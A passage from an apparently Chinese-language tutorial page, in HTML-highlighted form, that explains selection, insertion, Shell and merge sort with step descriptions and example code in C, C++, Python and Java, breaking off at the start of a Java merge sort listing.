每轮需要比较的次数 N-i</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &lt; arr[min]) &#123;</span><br><span class="line">                    <span class="comment">// 记录目前能找到的最小值元素的下标</span></span><br><span class="line">                    min = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将找到的最小值和i位置所在的值进行交换</span></span><br><span class="line">            <span class="keyword">if</span> (i != min) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">                arr[i] = arr[min];</span><br><span class="line">                arr[min] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、插入排序"><a href="#三、插入排序" class="headerlink" title="三、插入排序"></a>三、插入排序</h3><h4 id="1-算法步骤-2"><a href="#1-算法步骤-2" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</p><p>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。</p><p>（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</p><p>优化算法：拆半插入</p><h4 id="2-代码实现-2"><a href="#2-代码实现-2" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-2"><a href="#C：-2" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insertion_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i,j,key;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">                key = arr[i];</span><br><span class="line">                j=i<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span>((j&gt;=<span class="number">0</span>) &amp;&amp; (arr[j]&gt;key)) &#123;</span><br><span class="line">                        arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">                        j--;</span><br><span class="line">                &#125;</span><br><span class="line">                arr[j+<span class="number">1</span>] = key;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-2"><a href="#C-：-2" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertion_sort</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">                <span class="type">int</span> key=arr[i];</span><br><span class="line">                <span class="type">int</span> j=i<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span>((j&gt;=<span class="number">0</span>) &amp;&amp; (key&lt;arr[j]))&#123;</span><br><span class="line">                        arr[j+<span class="number">1</span>]=arr[j];</span><br><span class="line">                        j--;</span><br><span class="line">                &#125;</span><br><span class="line">                arr[j+<span class="number">1</span>]=key;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-2"><a href="#Python：-2" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insertionSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        preIndex = i-<span class="number">1</span></span><br><span class="line">        current = arr[i]</span><br><span class="line">        <span class="keyword">while</span> preIndex &gt;= <span class="number">0</span> <span class="keyword">and</span> arr[preIndex] &gt; current:</span><br><span class="line">            arr[preIndex+<span class="number">1</span>] = arr[preIndex]</span><br><span class="line">            preIndex-=<span class="number">1</span></span><br><span class="line">        arr[preIndex+<span class="number">1</span>] = current</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java：-2"><a href="#Java：-2" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从下标为1的元素开始选择合适的位置插入，因为下标为0的只有一个元素，默认是有序的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录要插入的数据</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从已经排序的序列最右边的开始比较，找到比其小的数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; tmp &lt; arr[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 存在比其小的数，插入</span></span><br><span class="line">            <span class="keyword">if</span> (j != i) &#123;</span><br><span class="line">                arr[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、希尔排序"><a href="#四、希尔排序" class="headerlink" title="四、希尔排序"></a>四、希尔排序</h3><h4 id="1-算法步骤-3"><a href="#1-算法步骤-3" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录”基本有序”时，再对全体记录进行依次直接插入排序。</p><p>选择一个增量序列 t1，t2，……，tk，其中 ti &gt; tj, tk &#x3D; 1；</p><p>按增量序列个数 k，对序列进行 k 趟排序；</p><p>每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p><h4 id="2-代码实现-3"><a href="#2-代码实现-3" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-3"><a href="#C：-3" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">shell_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="type">int</span> gap, i, j;</span><br><span class="line">        <span class="type">int</span> temp;</span><br><span class="line">        <span class="keyword">for</span> (gap = len &gt;&gt; <span class="number">1</span>; gap &gt; <span class="number">0</span>; gap &gt;&gt;= <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">for</span> (i = gap; i &lt; len; i++) &#123;</span><br><span class="line">                        temp = arr[i];</span><br><span class="line">                        <span class="keyword">for</span> (j = i - gap; j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp; j -= gap)</span><br><span class="line">                                arr[j + gap] = arr[j];</span><br><span class="line">                        arr[j + gap] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-3"><a href="#C-：-3" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell_sort</span><span class="params">(T array[], <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> h = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (h &lt; length / <span class="number">3</span>) &#123;</span><br><span class="line">        h = <span class="number">3</span> * h + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (h &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= h &amp;&amp; array[j] &lt; array[j - h]; j -= h) &#123;</span><br><span class="line">                std::<span class="built_in">swap</span>(array[j], array[j - h]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        h = h / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-3"><a href="#Python：-3" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shellSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    gap=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(gap &lt; <span class="built_in">len</span>(arr)/<span class="number">3</span>):</span><br><span class="line">        gap = gap*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gap &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(gap,<span class="built_in">len</span>(arr)):</span><br><span class="line">            temp = arr[i]</span><br><span class="line">            j = i-gap</span><br><span class="line">            <span class="keyword">while</span> j &gt;=<span class="number">0</span> <span class="keyword">and</span> arr[j] &gt; temp:</span><br><span class="line">                arr[j+gap]=arr[j]</span><br><span class="line">                j-=gap</span><br><span class="line">            arr[j+gap] = temp</span><br><span class="line">        gap = math.floor(gap/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java：-3"><a href="#Java：-3" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">shellSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> arr.length;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> length / <span class="number">2</span>; step &gt;= <span class="number">1</span>; step /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> step; i &lt; length; i++) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - step;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp) &#123;</span><br><span class="line">                arr[j + step] = arr[j];</span><br><span class="line">                j -= step;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[j + step] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五、归并排序"><a href="#五、归并排序" class="headerlink" title="五、归并排序"></a>五、归并排序</h3><h4 id="1-算法步骤-4"><a href="#1-算法步骤-4" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</p><p>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</p><p>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</p><p>重复步骤 3 直到某一指针达到序列尾；</p><p>将另一序列剩下的所有元素直接复制到合并序列尾。</p><h4 id="2-代码实现-4"><a href="#2-代码实现-4" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C迭代版："><a href="#C迭代版：" class="headerlink" title="C迭代版："></a>C迭代版：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *a = arr;</span><br><span class="line">    <span class="type">int</span> *b = (<span class="type">int</span> *) <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> seg, start;</span><br><span class="line">    <span class="keyword">for</span> (seg = <span class="number">1</span>; seg &lt; len; seg += seg) &#123;</span><br><span class="line">        <span class="keyword">for</span> (start = <span class="number">0</span>; start &lt; len; start += seg * <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> low = start, mid = min(start + seg, len), high = min(start + seg * <span class="number">2</span>, len);</span><br><span class="line">            <span class="type">int</span> k = low;</span><br><span class="line">            <span class="type">int</span> start1 = low, end1 = mid;</span><br><span class="line">            <span class="type">int</span> start2 = mid, end2 = high;</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1 &amp;&amp; start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start1] &lt; a[start2] ? a[start1++] : a[start2++];</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1)</span><br><span class="line">                b[k++] = a[start1++];</span><br><span class="line">            <span class="keyword">while</span> (start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> *temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a != arr) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        b = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C递归版："><a href="#C递归版：" class="headerlink" title="C递归版："></a>C递归版：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">merge_sort_recursive</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> reg[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> len = end - start, mid = (len &gt;&gt; <span class="number">1</span>) + start;</span><br><span class="line">    <span class="type">int</span> start1 = start, end1 = mid;</span><br><span class="line">    <span class="type">int</span> start2 = mid + <span class="number">1</span>, end2 = end;</span><br><span class="line">    merge_sort_recursive(arr, reg, start1, end1);</span><br><span class="line">    merge_sort_recursive(arr, reg, start2, end2);</span><br><span class="line">    <span class="type">int</span> k = start;</span><br><span class="line">    <span class="keyword">while</span> (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2)</span><br><span class="line">        reg[k++] = arr[start1] &lt; arr[start2] ? arr[start1++] : arr[start2++];</span><br><span class="line">    <span class="keyword">while</span> (start1 &lt;= end1)</span><br><span class="line">        reg[k++] = arr[start1++];</span><br><span class="line">    <span class="keyword">while</span> (start2 &lt;= end2)</span><br><span class="line">        reg[k++] = arr[start2++];</span><br><span class="line">    <span class="keyword">for</span> (k = start; k &lt;= end; k++)</span><br><span class="line">        arr[k] = reg[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> reg[len];</span><br><span class="line">    merge_sort_recursive(arr, reg, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-迭代版："><a href="#C-迭代版：" class="headerlink" title="C++迭代版："></a>C++迭代版：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    T *a = arr;</span><br><span class="line">    T *b = <span class="keyword">new</span> T[len];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> seg = <span class="number">1</span>; seg &lt; len; seg += seg) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; len; start += seg + seg) &#123;</span><br><span class="line">            <span class="type">int</span> low = start, mid = <span class="built_in">min</span>(start + seg, len), high = <span class="built_in">min</span>(start + seg + seg, len);</span><br><span class="line">            <span class="type">int</span> k = low;</span><br><span class="line">            <span class="type">int</span> start1 = low, end1 = mid;</span><br><span class="line">            <span class="type">int</span> start2 = mid, end2 = high;</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1 &amp;&amp; start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start1] &lt; a[start2] ? a[start1++] : a[start2++];</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1)</span><br><span class="line">                b[k++] = a[start1++];</span><br><span class="line">            <span class="keyword">while</span> (start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start2++];</span><br><span class="line">        &#125;</span><br><span class="line">        T *temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a != arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        b = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-递归版："><a href="#C-递归版：" class="headerlink" title="C++递归版："></a>C++递归版：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;Array, <span class="type">int</span> front, <span class="type">int</span> mid, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 先决条件:</span></span><br><span class="line">    <span class="comment">// Array[front...mid] 已排序完成</span></span><br><span class="line">    <span class="comment">// Array[mid+1 ... end] 已排序完成</span></span><br><span class="line">    <span class="comment">// 复制 Array[front ... mid] 到 LeftSubArray</span></span><br><span class="line">    <span class="comment">// 复制 Array[mid+1 ... end] 到 RightSubArray</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">LeftSubArray</span><span class="params">(Array.begin() + front, Array.begin() + mid + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">RightSubArray</span><span class="params">(Array.begin() + mid + <span class="number">1</span>, Array.begin() + end + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> idxLeft = <span class="number">0</span>, idxRight = <span class="number">0</span>;</span><br><span class="line">    LeftSubArray.<span class="built_in">insert</span>(LeftSubArray.<span class="built_in">end</span>(), numeric_limits&lt;<span class="type">int</span>&gt;::<span class="built_in">max</span>());</span><br><span class="line">    RightSubArray.<span class="built_in">insert</span>(RightSubArray.<span class="built_in">end</span>(), numeric_limits&lt;<span class="type">int</span>&gt;::<span class="built_in">max</span>());</span><br><span class="line">    <span class="comment">// 选中LeftSubArray[idxLeft] 和 RightSubArray[idxRight]的最小值,将它放入 Array[i]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = front; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LeftSubArray[idxLeft] &lt; RightSubArray[idxRight]) &#123;</span><br><span class="line">            Array[i] = LeftSubArray[idxLeft];</span><br><span class="line">            idxLeft++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Array[i] = RightSubArray[idxRight];</span><br><span class="line">            idxRight++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;Array, <span class="type">int</span> front, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (front &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid = (front + end) / <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">MergeSort</span>(Array, front, mid);</span><br><span class="line">    <span class="built_in">MergeSort</span>(Array, mid + <span class="number">1</span>, end);</span><br><span class="line">    <span class="built_in">Merge</span>(Array, front, mid, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-4"><a href="#Python：-4" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mergeSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(arr)&lt;<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    middle = math.floor(<span class="built_in">len</span>(arr)/<span class="number">2</span>)</span><br><span class="line">    left, right = arr[<span class="number">0</span>:middle], arr[middle:]</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">left,right</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">        <span class="keyword">if</span> left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]:</span><br><span class="line">            result.append(left.pop(<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> left:</span><br><span class="line">        result.append(left.pop(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">while</span> right:</span><br><span class="line">        result.append(right.pop(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h5 id="Java：-4"><a href="#Java：-4" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 